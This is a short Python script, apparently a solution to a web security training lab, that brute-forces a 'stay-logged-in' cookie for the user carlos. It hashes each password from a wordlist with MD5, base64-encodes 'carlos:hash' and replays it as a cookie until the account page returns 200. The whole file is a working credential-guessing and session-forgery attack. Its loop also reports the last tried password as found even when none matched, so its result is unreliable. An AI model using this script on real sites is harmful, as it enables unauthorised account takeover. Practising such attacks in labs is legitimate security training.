#Lab: Brute-forcing a stay-logged-in cookie

import requests
import sys
import base64
import hashlib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def main():

    try:
        
        url=sys.argv[1].strip()
        passwords=sys.argv[2].strip()
        valid_pass=exploit(url,passwords)
        if(valid_pass):
            print("[+] Found Valid password : "+valid_pass)
            sys.exit()
        else:
            print("[-] Not able to find the password")
            sys.exit()
    except IndexError:
            print("[-] Missing Paramaters")
            print("[+] Usage python %s <url> passwords "%sys.argv[0])
            sys.exit()
def exploit(url,passwords):
    url=url+"my-account?id=carlos"
    with open(passwords) as password:
        for passwd in password:
                passwd=passwd.strip()
                passwd_byte=passwd.encode("ascii")
                hashed_passwd=hashlib.md5(passwd_byte)
                full_hash='carlos:'+hashed_passwd.hexdigest()
                b64_hash=base64.b64encode(full_hash.encode('ascii'))
                stay_logged_in_cookie=b64_hash.decode("ascii")
                print("Trying password : "+passwd)
                cookies={'stay-logged-in':stay_logged_in_cookie}
                r=requests.get(url,cookies=cookies,proxies=proxies,verify=False,allow_redirects=False)
                if r.status_code==200:
                    break

    return passwd

if __name__=="__main__":
    main()